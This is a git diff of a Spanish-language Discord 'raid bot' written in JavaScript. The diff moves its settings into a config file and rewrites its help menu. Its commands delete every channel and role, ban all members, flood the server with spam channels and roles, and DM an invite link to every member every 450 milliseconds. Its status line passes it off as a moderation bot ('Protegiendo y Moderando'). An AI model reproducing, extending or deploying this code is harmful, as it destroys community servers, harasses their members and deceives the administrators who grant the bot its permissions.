@@ -1,35 +1,40 @@
 const Discord = require('discord.js');
+const config = require("./config.json");
 const client = new Discord.Client();
 const chalk = require('chalk');
 const fs = require('fs');
-const PREFIX = "!"
+const prefix = config.prefix
 const {MessageEmbed} = require('discord.js')
 const EventEmitter = require('events');
 const emitter = new EventEmitter()
 emitter.setMaxListeners(50)
-const ownersid = ["660627270049857548", "902735999887630387"]
-//ganti pake id klean
+const ownersid = config.ids;
+
 
   client.on('ready', () => {
-  console.log("");       
+  console.log("\n██████╗░░█████╗░██╗██████╗░\n██╔══██╗██╔══██╗██║██╔══██╗\n██████╔╝███████║██║██║░░██║\n██╔══██╗██╔══██║██║██║░░██║\n██║░░██║██║░░██║██║██████╔╝\n╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░\n\n██████╗░░█████╗░████████╗\n██╔══██╗██╔══██╗╚══██╔══╝\n██████╦╝██║░░██║░░░██║░░░\n██╔══██╗██║░░██║░░░██║░░░\n██████╦╝╚█████╔╝░░░██║░░░\n╚═════╝░░╚════╝░░░░╚═╝░░░\nMADE BY KATAST.");  
+  
+  
+  
   console.log((chalk.red(`Encendido en: ${client.user.tag}`)));
-  console.log("Owners: " + id + " & " + id2)
+  console.log("Owners: " + ownersid)
   })  
 
 client.on("message", message => {
   if (message.author.bot) return
-    if (message.content === '.help') {
+    if (message.content === prefix + 'help') {
         if(!ownersid.includes(message.author.id)){
             return message.channel.send('comando no disponible')
         }
 
   const embed = new MessageEmbed()
               message.channel.send(embed)
-message.channel.send({
+message.author.send({
   embed: {
-    title: 'Help Commands',
-    description: '** \n1. .nuke**\n_Destroy_ \n**2. .on**\n_Nuke + Spam Channel And Everyone\n**3. .dmall**\n_ Dm All Member\n**4. .spam**\n_Spam Everyone_\n**5. !banall**\n_Ban All Member_\n**6. .roles**\n_Create Random Roles_\n**7. .dr**\n_Delete All Roles_',
-    image: {url: 'https://media.discordapp.net/attachments/939335341465296948/939419619687530566/05088f68a5606e3b534fbb2a3f110fd39f5deac9r1-444-250_hq.gif'}
+    title: 'Destructor Comandos',
+    description: '**.on**\nDestruye todo el servidor por completo\n**.nuke**\nElimina todos los canales\n**.dr**\nElimina Los Roles.\n**.cr**\nCrea Roles.\n**.mdall**\nEnvia mensaje directo a todos los miembros.\n**.banall**\nNo creo que este comando necesite descripción.',
+    image: {url: 'https://cdn.discordapp.com/attachments/1014221409368682506/1014221571444973639/20220826_084225.gif'},
+    color: "000001"
   
   }
 })
@@ -41,7 +46,7 @@ client.on("message", message => {
   
     
 
- if (message.content === '.on') {
+ if (message.content === prefix + 'on') {
      if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")
 
   if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
@@ -118,7 +123,6 @@ message.guild.channels.create(`6IX SKULLS`, {
 
   if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
               message.delete();
-    message.channel.send("> Hecho!**")
               setInterval(function(){
                 member.send("https://discord.gg/hZK9UgU6Td").catch(error => {});
               },450);
@@ -130,7 +134,7 @@ message.guild.channels.create(`6IX SKULLS`, {
 
   
   
-if (message.content === '.nuke') {
+if (message.content === prefix + 'nuke') {
      if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")
 
   if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
@@ -184,7 +188,7 @@ message.guild.channels.create(`6IX SKULLS`, {
 
                         
 
-            if(message.content === ".dmall") {
+            if(message.content === prefix + "mdall") {
               
             message.guild.members.cache.forEach(member => {
                 if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")
@@ -200,17 +204,17 @@ message.guild.channels.create(`6IX SKULLS`, {
             
             
             
-    if(message.content === ('.dr')){
+    if(message.content === (prefix + 'dr')){
         if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")
 
   if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
                    
     message.channel.send("> Hecho")
-                        message.guild.roles.cache.map(roles => roles.delete());
+                        message.guild.roles.cache.map(roles => roles.delete()); 
                       }
         
         
-if (message.content === '.cr') {
+if (message.content === prefix + 'cr') {
   if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")
 
   if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
@@ -223,7 +227,7 @@ if (message.content === '.cr') {
             };
              }
         
-if (message.content === '.banall') {
+if (message.content === prefix + 'banall') {
     if(message.channel.type == "dm") return message.channel.send("Que estas intentando?")
 
   if (!ownersid.includes(message.author.id)) return message.channel.send("Comando no disponible.");
@@ -239,7 +243,7 @@ if (message.content === '.banall') {
 
  client.on('ready', () => {
     console.log('Hecho!')
-    client.user.setActivity(`Protegiendo y Moderando`, { type: "STREAMING" })
+    client.user.setActivity(config.estado, { type: "STREAMING" })
 });          
 
 
@@ -252,4 +256,3 @@ require("http").createServer((_, res) => res.end("Bot Encendido.")).listen(8080)
         
         
 client.login(process.env['token'])
-//token bot lu
